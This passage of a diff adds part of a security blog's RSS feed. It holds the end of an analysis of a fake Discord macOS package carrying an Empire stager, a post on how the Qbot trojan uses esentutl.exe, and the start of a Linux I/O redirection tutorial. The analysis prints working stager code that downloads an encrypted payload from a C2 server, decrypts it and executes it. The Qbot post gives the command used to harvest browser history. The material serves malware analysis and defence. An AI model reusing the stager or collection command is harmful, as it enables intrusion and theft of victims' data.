+proxy &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; urllib2.ProxyHandler&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+o &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; urllib2.build_opener&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;proxy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+urllib2.install_opener&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;urllib2.urlopen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.read&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a[0:4]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a[4:]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IV+&lt;span class=&quot;s1&quot;&gt;&apos;0ef96732789718525e763829370bd488&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;S,j,out&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;range&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;256&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,0,[]
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;range&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;256&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+    &lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;j+S[i]+ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;key[i%len&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;o&quot;&gt;)]))&lt;/span&gt;%256
+    S[i],S[j]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S[j],S[i]
+&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;data:
+    &lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;i+1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%256
+    &lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;j+S[i]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%256
+    S[i],S[j]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S[j],S[i]
+    out.append&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;chr&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;char&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^S[&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S[i]+S[j]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%256]&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;out&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;While inspecting the Python code, we can note a few things for leads. First, the C2 server for this implant is at 176.126.70.xxx (intentionally redacted) on port 10001 listening for the HTTP protocol. When visiting the C2 server for commands, the code will request a URI path of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login/process.php&lt;/code&gt; using a user-agent string of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&lt;/code&gt;. Both of these details help Empire’s network traffic masquerade as legitimate traffic in an enterprise network.&lt;/p&gt;
+
+&lt;p&gt;With this cleartext code, we can easily attribute the code to Empire with code publicly available on GitHub. In this case, the Python code comes from this file in the former, archived Empire repository: &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413&quot;&gt;https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The PKG stager packaging is also in the repository here: &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404&quot;&gt;https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;does-the-app-even-do-anything&quot;&gt;Does The App Even Do Anything?&lt;/h2&gt;
+
+&lt;p&gt;From here we’re certain the PKG file contains an Empire stager, but it could also potentially contain legitimate functionality related to Discord. We can rule that out by investigating the rest of the PKG contents.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Applications/Discord.app/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+└── Contents
+    ├── _CodeSignature
+    │   └── CodeResources
+    ├── Info.plist
+    ├── MacOS
+    │   └── Discord
+    ├── PkgInfo
+    └── Resources
+        ├── Base.lproj
+        │   └── MainMenu.nib
+        └── Scatter.icns
+
+5 directories, 6 files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tree&lt;/code&gt; command, we can inspect the folder structure without all the laborious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; commands. Within macOS application bundles, the main executable of interest typically lives in the Contents/MacOS folder. In this case, it’s named Discord.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Contents/MacOS/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file Discord 
+Discord: Mach-O 64-bit x86_64 executable, flags:&amp;lt;NOUNDEFS|DYLDLINK|TWOLEVEL|PIE&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; we know that Discord is definitely a Mach-O executable binary. We’re not going to fully reverse the binary, but we can get some additional evidence by simply running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; to see if we can identify suspicious binary contents. First, we’ll run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; to get standard ASCII characters into a file. Then, we’ll re-run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; again, targeting the Unicode characters.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings Discord &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; discord.strings.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-el&lt;/span&gt; Discord &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; discord.strings.txt 
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less discord.strings.txt
+
+__PAGEZERO
+__TEXT
+__text
+__TEXT
+__const
+__TEXT
+__unwind_info
+__TEXT
+__DATA
+__objc_imageinfo__DATA
+__LINKEDIT
+/usr/lib/dyld
+/System/Library/Frameworks/Python.framework/Versions/2.7/Python
+/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
+/usr/lib/libobjc.A.dylib
+/usr/lib/libSystem.B.dylib
+@&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#)PROGRAM:templateMachoExe  PROJECT:templateMachoExe-&lt;/span&gt;
+_mh_execute_header
+:main
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;templateMachoExeVersion
+String
+UNumber
+__mh_execute_header
+_main
+_templateMachoExeVersionNumber
+_templateMachoExeVersionString
+dyld_stub_binder
+templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
+PC^t
+templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
+@DxG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s not common to see a functional binary quite this lean in strings. In fact, there doesn’t appear to be anything in the binary specifically relevant to Discord in any way. An additional lead to investigate is the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;templateMachoExe&lt;/code&gt; present in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; output. This string could indicate the binary is a generic copy of the template Mach-O file contained with Empire. To find out for sure, you can download the &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/misc/machotemplate&quot;&gt;template file&lt;/a&gt; and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; against it to compare the output.&lt;/p&gt;
+
+&lt;p&gt;Hopefully this helps illustrate how Empire stagers work on macOS, thanks for reading!&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 08 Feb 2021 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/macos/empire/pkg/malware/2021/02/08/analyzing-empire-macos-pkg.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/macos/empire/pkg/malware/2021/02/08/analyzing-empire-macos-pkg.html</guid>
+        
+        
+        <category>macOS</category>
+        
+        <category>Empire</category>
+        
+        <category>PKG</category>
+        
+        <category>malware</category>
+        
+      </item>
+    
+      <item>
+        <title>How Qbot Uses Esentutl</title>
+        <description>&lt;p&gt;A colleague asked me a question today about the relationship between Qbot and a Windows system utility: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esentutl.exe&lt;/code&gt;. It’s been sparsely documented &lt;a href=&quot;https://twitter.com/redcanary/status/1334224870536712192&quot;&gt;via tweet&lt;/a&gt;, and I want to more fully explain why Qbot jumped into using the utility during operations.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-webcache&quot;&gt;The WebCache&lt;/h2&gt;
+
+&lt;p&gt;Qbot is a banking trojan, so its operators are naturally interested in obtaining data from victim hosts. The data includes internet browsing history, files opened, and much more. This data now lives within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebCacheV01.dat&lt;/code&gt; database. In modern versions of Internet Explorer, the database uses the Microsoft Extensible Storage Engine (ESE) database format, the format famous for Exchange and Active Directory databases. As with other transactional databases, the WebCache may have multiple entries in a transaction log that get applied to the database file over time as the system allows write operations to the database. This helps improve resilience of the database and allows recoveries/rollbacks. This is where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esentutl.exe&lt;/code&gt; becomes useful.&lt;/p&gt;
+
+&lt;h2 id=&quot;flushing-the-data&quot;&gt;Flushing the Data&lt;/h2&gt;
+
+&lt;p&gt;Qbot borrowed a trick from digital forensic examiners to get victim internet history data. As &lt;a href=&quot;https://www.sans.org/blog/ese-databases-are-dirty/&quot;&gt;documented by SANS&lt;/a&gt; and &lt;a href=&quot;https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/&quot;&gt;others&lt;/a&gt;, an examiner could get data from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebCacheV01.dat&lt;/code&gt; file, but it would be incomplete as multiple log files may exist. This places the database in a “dirty” state. To get a complete, “clean” copy of the database, the examiner should first execute a recovery with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esentutl.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So Qbot uses a command like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;esentutl&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.exe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/r &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;V01&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/l&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\[REDACTED]\AppData\Local\Microsoft\Windows\WebCache&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\[REDACTED]\AppData\Local\Microsoft\Windows\WebCache&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\[REDACTED]\AppData\Local\Microsoft\Windows\WebCache&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the command, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/r V01&lt;/code&gt; indicates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esentutl.exe&lt;/code&gt; will execute a recovery operation using the database log file V01. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/l&lt;/code&gt; specifies the location of log files, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/s&lt;/code&gt; specifies the location of system files (including a checkpoint file), and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/d&lt;/code&gt; specifies the location of database files. All the relevant files live in the same folder, leading to the same path appearing three times in the command. After this command executes, the data from the WebCache database log files is flushed into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebCacheV01.dat&lt;/code&gt; database and Qbot can pick that file up for later use.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v=ws.11)&quot;&gt;esentutl Reference&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 01 Feb 2021 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/qbot/malware/esentutil/2021/02/01/how-qbot-uses-esentutl.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/qbot/malware/esentutil/2021/02/01/how-qbot-uses-esentutl.html</guid>
+        
+        
+        <category>qbot</category>
+        
+        <category>malware</category>
+        
+        <category>esentutil</category>
+        
+      </item>
+    
+      <item>
+        <title>Road to RHCSA 8 - I/O Redirection, Piping, and Their Evil Uses</title>
+        <description>&lt;p&gt;Bourne-compatible Unix shells (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sh&lt;/code&gt;, etc.) usually include capabilities to redirect input and output in the shell. One of the basic objectives of RHCSA 8 is to learn how to manipulate input and output, and since I work in security I wanted to put a spin on the content to show how adversaries may use I/O redirection to stump defenders. If you already know about I/O redirection and you’re just here for the security stuff, &lt;a href=&quot;#-Evil-Uses-of-Redirection-and-Piping&quot;&gt;jump forward here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;basics-of-io-redirection&quot;&gt;Basics of I/O Redirection&lt;/h2&gt;
+
+&lt;h3 id=&quot;in-and-out-again&quot;&gt;In and Out Again&lt;/h3&gt;
+
+&lt;p&gt;From the moment you begin interacting with Linux systems you use the standard forms of input and output- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; stream usually comes from the keyboard and represents what you type into the command-line interface to interact with Linux. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; stream is the opposite, text that echoes to the console outputting from programs. Consider this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this case, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; stream is provided by reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello World&quot;&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; stream is the display of what is echoed to the console. Millions of Linux devices across the world could work with just displaying things to the console, but they work a lot better making use of redirection. The most fundamental use of redirection comes from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; character. This will place the output of a program into a file. For example, I use this command frequently when analyzing malware:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings malware.bin &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; malware.strings.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This command takes the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; and redirects it into the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware.strings.txt&lt;/code&gt; so I can read it later at my convenience. Keep in mind that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; operator will overwrite files without warning. If I execute another command to redirect output into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware.strings.txt&lt;/code&gt; it will be overwritten. If I want to append text to the same file, I have to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&amp;gt;&lt;/code&gt; instead. When I use it, the commands look something like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-eL&lt;/span&gt; malware.bin &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; malware.strings.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this case, the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; is appended to my previous text file.&lt;/p&gt;
+
+&lt;p&gt;An operation that’s a bit less common is input redirection using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&lt;/code&gt;. In these cases, you can use the contents of files as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; stream. In the first example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sort&lt;/code&gt; will take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; and provide the normal console output:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &amp;lt; /etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the case of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&lt;/code&gt; you can specify for the shell to read until it reaches a specific delimiter:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+&amp;gt; thing
+&amp;gt; thing
+&amp;gt; EOF
+12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That last one (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&lt;/code&gt;) is much more useful in script form than on the command line.&lt;/p&gt;
+
+&lt;h3 id=&quot;everyone-makes-errors&quot;&gt;Everyone Makes Errors&lt;/h3&gt;
+
+&lt;p&gt;The third I/O stream is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stderr&lt;/code&gt;. Imagine if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; received only diagnostic and error information, and that’s the simplification of this stream. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&amp;gt;&lt;/code&gt; to output this stream to a file, if desired. In this case, I attempt to copy a file into a folder that I shouldn’t without root privileges:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; ~/delete-me.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ~/delete-me.txt /etc/ 2&amp;gt; copy-errors.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If desired, you can also prevent any errors from showing on the console. You can do this by using a &lt;strong&gt;device file&lt;/strong&gt; named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; ~/delete-me.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ~/delete-me.txt /etc/ 2&amp;gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;thats-not-lead-piping&quot;&gt;That’s Not Lead Piping&lt;/h3&gt;
+
+&lt;p&gt;Alongside output redirection, you’ll likely use piping frequently in Linux. A pipe is represented by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|&lt;/code&gt; and will let you directly use the output from one command as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; stream of another. Consider this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings malware.bin | less
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The command will take the output from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; and let me immediately inspect it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt;. This sort of action is commonly used to scroll through many lines of output without it rushing by in the console. This can also be used numerous times in a row:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/wordlist.txt | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sorted-dedup-list.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this case, I piped the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uniq&lt;/code&gt; to remove duplicates, and that output was further &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sort&lt;/code&gt;ed and redirected into a file.&lt;/p&gt;
+
+&lt;h3 id=&quot;file-descriptors-nothing-clever&quot;&gt;File Descriptors (nothing clever)&lt;/h3&gt;
+
+&lt;p&gt;As you dive deeper into Linux internals you’ll eventually encounter &lt;strong&gt;file descriptors&lt;/strong&gt;. These structures are handles to files used by a program when they are opened. If you want, on Linux systems you can check out file descriptors for a process under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/[pid]/fd&lt;/code&gt;. For processes you typically interact with, there are three guaranteed file descriptors open: 0, 1, and 2. These correspond to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stderr&lt;/code&gt;, respectively. This is the reason you can manipulate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stderr&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&amp;gt;&lt;/code&gt;. Due to this, you can also manipulate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stdout&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&amp;lt;&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&amp;gt;&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&amp;gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;evil-uses-of-redirection-and-piping&quot;&gt;Evil Uses of Redirection and Piping&lt;/h2&gt;
+
+&lt;p&gt;Adversaries can use redirection effectively during exploitation. Let’s imagine a scenario where an adversary exploits a web server and can issue commands. They can’t yet upload files, but they can manipulate whatever they want in text form. We may see something like this during exploitation:&lt;/p&gt;
+
